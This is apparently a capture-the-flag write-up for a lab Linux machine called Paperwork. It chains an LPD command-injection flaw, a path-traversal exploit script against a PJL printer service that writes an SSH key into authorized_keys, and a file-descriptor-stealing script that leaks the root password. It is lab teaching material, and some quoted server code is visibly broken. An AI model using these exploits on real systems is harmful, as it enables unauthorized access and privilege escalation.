## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Season - 11 Machine 
Reactor  - Easy   - Linux
```
## IP-Address
```Machine Information
10.129.69.234
```
## Set MTU
```bash
sudo ip link set dev tun0 mtu 1200
```
----
## Enumeration
- Port Scanning
```bash
PORT     STATE SERVICE        REASON         VERSION
22/tcp   open  ssh            syn-ack ttl 63 OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           syn-ack ttl 63 nginx 1.28.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://paperwork.htb/
|_http-server-header: nginx/1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol? syn-ack ttl 63
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
```
- Add `10.129.69.234 paperwork.htb` in the file `/etc/hosts` 
- Browse `http://paperwork.htb/`
```html
Maintenance Advisory: Backend spooler PRN-ARCHIVE-01 management console is currently offline. Manual ingestion remains active via the legacy gateway.

System Configuration
Protocol	Compliance Level: RFC 1179
Target Queue	archive_intake
Internal Processor	paperwork-archive-v1.02
```
- Downloaded the Zip File 
```python
 cat server.py
import socket
import threading
import subprocess
import subprocess

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return

            command = data[0]

            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")

        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()

        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01')
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break

            subcommand = chunk[0]
            self.sock.send(b'\x00')
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue

                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)

                decoded_content = content.decode(errors='ignore')

                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break

                print(f"{self.id} Executing archive for: {job_name}")
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

                self.sock.send(b'\x00')
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break

class LpdServer:

    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)
        print(f"[*] LPD Server listening on {port}")

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()
```
- Got the backend server running on port - `1515`
```bash
- Github exploit added - Paperwork.py
```
- Got the reverse-shell
```bash
lp@paperwork:/$ whoami
lp
lp@paperwork:/$ id
uid=7(lp) gid=7(lp) groups=7(lp)
lp@paperwork:/$ uname -a
Linux paperwork 6.17.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 19 16:42:13 UTC 2026 x86_64 GNU/Linux
lp@paperwork:/$
```
- Running `linPEAS` identified several interesting services running on the system.
```bashg
/usr/bin/python3 /home/archivist/printer/jetdirect.py 
```
- While enumerating the system after obtaining the `lp` shell, I identified another locally accessible service listening on `127.0.0.1:9100`.
```bash
lp@paperwork:/home$ ps -ef | grep -E "python|9100"
root          /usr/bin/python3 /root/staging/CorpoSite/app.py
archivi+      /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
root         /usr/bin/python3 /usr/bin/paperwork-daemon
```
- Suspicious Services
```notes
- /usr/bin/paperwork-daemon
- /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
```
- Got the backend server on port `9100` - its running `PJL` - `Printer Job Language` commands like -  
```bash
$ telnet 127.0.0.1 9100
telnet 127.0.0.1 9100
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
@PJL FSQUERY NAME="0:\"
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119

@PJL INFO STATUS
OK

@PJL INFO CONFIG
OK

@PJL FSUPLOAD NAME="0:\jetdirect.py" OFFSET=0 SIZE=5119
Prints the Code
```
- `Jetdirect.py` Code base 
```python
#!/usr/bin/env python3

import os
import sys
import socket
import logging
import re
import hashlib

class PJLServer:
    def __init__(self):
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def listen(self, port=9100, backlog=100):
        self._server.bind(("127.0.0.1", port))
        self._server.listen(backlog)
        logging.info("Listening on port %d" % port)

    def accept(self):
        client, addr = self._server.accept()
        logging.info("[%s] connected" % addr[0])
        return PJLClient(client, addr[0])

class PJLClient:
    def __init__(self, client, address):
        self._client = client
        self._address = address

    def get_line(self):
        """Reads until a newline to get a single PJL command."""
        line = b""
        while True:
            char = self._client.recv(1)
            if not char: return None
            line += char
            if char == b"\n": break
        return line

    def reply(self, message):
        if isinstance(message, str):
            message = message.encode("utf-8")
        self._client.sendall(message)

    def close(self):
        self._client.close()

class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))

    def listdir(self, name=""):
        target = self._translate(name)
        if not os.path.exists(target): return "FILEERROR=1"
        try:
            items = os.listdir(target)
            res = [". TYPE=DIR", ".. TYPE=DIR"]
            for i in items:
                p = os.path.join(target, i)
                res.append(f"{i} TYPE={'DIR' if os.path.isdir(p) else 'FILE'} SIZE={os.path.getsize(p)}")
            return "\n".join(res)
        except: return "FILEERROR=1"

    def read(self, path):
        target = self._translate(path)
        if os.path.isfile(target):
            with open(target, "rb") as f: return f.read()
        return None

    def write(self, path, data):
        target = self._translate(path)
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as f: f.write(data)
            return "OK"
        except: return "FILEERROR=1"

fs = None

def handle_download(command, client):
    m = re.search(r'NAME\s*=\s*"([^"]+)"\s*SIZE\s*=\s*(\d+)', command, re.I)
    if not m: return "FILEERROR=1"
    path, size = m.group(1), int(m.group(2))

    logging.info(f"Receiving file: {path} ({size} bytes)")
    data = b""
    while len(data) < size:
        chunk = client._client.recv(min(size - len(data), 4096))
        if not chunk: break
        data += chunk
    return fs.write(path, data)

def handle_upload(command):
    m = re.search(r'NAME\s*=\s*"([^"]+)"', command, re.I)
    if not m: return "FILEERROR=1"
    path = m.group(1)
    data = fs.read(path)
    if data is None: return "FILEERROR=1"
    header = f'@PJL FSUPLOAD NAME="{path}" SIZE={len(data)}\n'.encode("utf-8")
    return header + data

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <PORT> <ROOT_DIR>")
        sys.exit(1)

    fs = Filesystem(sys.argv[2])
    LOG_FILE = "/home/archivist/printer/logs/commands.log"
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[
            logging.FileHandler(LOG_FILE),
            logging.StreamHandler(sys.stdout)
        ]
    )
    server = PJLServer()
    server.listen(int(sys.argv[1]))

    while True:
        client = server.accept()
        while True:
            line_bytes = client.get_line()
            if not line_bytes: break

            # Filter protocol noise
            if b"@" not in line_bytes: continue
            line = line_bytes[line_bytes.find(b"@"):].decode("utf-8", errors="ignore").strip()

            if not line.startswith("@PJL"): continue
            logging.info(f"Command: {line}")

            if "FSDOWNLOAD" in line.upper():
                res = handle_download(line, client)
                client.reply(res + "\r\n")
            elif "FSUPLOAD" in line.upper():
                res = handle_upload(line)
                client.reply(res)
            elif "FSDIRLIST" in line.upper() or "FSQUERY" in line.upper():
                m = re.search(r'NAME\s*=\s*"([^"]+)"', line, re.I)
                res = fs.listdir(m.group(1) if m else "0:/")
                client.reply(res + "\r\n")
            elif "INFO ID" in line.upper():
                client.reply("HP LASERJET 4ML\r\n")
            elif "INFO FILESYS" in line.upper():
                client.reply("VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS\n0:     1755136    1718272    <HT>     <HT>  READ-WRITE\r\n")
            elif "ECHO" in line.upper():
                client.reply(line + "\r\n")
            else:
                client.reply("OK\r\n")
        client.close()
```
- Code Vulnerability
```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```
- Allow Directory Traversal & Edit `/ssh/authorized_keys`
- Lets Create the Script
```python
import socket

TARGET = "127.0.0.1"
PORT = 9100

pubkey = "ssh-ed25519 YOUR PUBLIC KEY HERE ash@kali"
data = pubkey.encode()

path = "0:\\..\\.ssh\\authorized_keys"
header = f'\x1b%-12345X@PJL FSDOWNLOAD NAME="{path}" SIZE={len(data)}\r\n'.encode()
footer = b'\x1b%-12345X'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))
s.sendall(header + data + footer)
print(s.recv(4096))
s.close()
```
- Execute it 
```bash
$python3 exploit.py
b'OK\r\n'
$ ssh -i id_ed25519 archivist@paperwork.htb
archivist@paperwork:~$ ls
printer  user.txt
archivist@paperwork:~$ cat user.txt
[flag omitted]
archivist@paperwork:~$ whoami
archivist
archivist@paperwork:~$ id
uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
```
- Enumerate More
```bash
$ netstat -lx
unix  2           5642     /run/systemd/io.systemd.sysext
unix  2           13455    /run/paperwork/mgmt.sock
unix  2           4658     /run/systemd/private
unix  2           4670     /run/lvm/lvmpolld.socket
```
- Got `/run/paperwork/mgmt.sock` & `usr/bin/paperwork-daemon`
```bash
$ cat /run/paperwork/mgmt.sock
STATUS: SYSTEM_CLEAN
SIGNATURE: [signature omitted]
```
- And other services `usr/bin/paperwork-daemon`
```bash
#!/usr/bin/python3
import socket, os, array, hashlib
import zipfile
import shutil

try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

        zip_path = "/root/quarantine/evidence.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(LOG_PATH, arcname="commands.log")


        with open(LOG_PATH, 'w') as f:
            f.truncate(0)

        os.close(log_fd)
    except:
        pass

def main():
    socket_path = "/run/paperwork/mgmt.sock"
    if os.path.exists(socket_path): os.remove(socket_path)
    if not os.path.exists("/run/paperwork"): os.makedirs("/run/paperwork")

    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000)
    s.listen(5)

    while True:
        conn, _ = s.accept()

        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())

        conn.close()

if __name__ == "__main__":
    main()
```
##### Privilege Escalation
- Create the python script to gain the password.
```python
import socket
import array
import os

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")

msg, ancdata, flags, addr = sock.recvmsg(
    1024,
    socket.CMSG_SPACE(8)
)

print(msg.decode())

for level, typ, data in ancdata:
    if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
        fds.frombytes(data)

for fd in fds:
    os.lseek(fd, 0, os.SEEK_SET)
    print(os.read(fd, 4096).decode(errors="ignore"))
```
- Execute the script
```bash
 python3 p.py
ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
[127.0.0.1] connected
FSUPLOAD
ADMIN_PASSWORD=[password omitted]
```
- Claim the Password user `root`.
```bash
~$ su root
Password:
root@paperwork:/home/archivist# cd /root
root@paperwork:~# cat root.txt
[flag omitted]
```
# END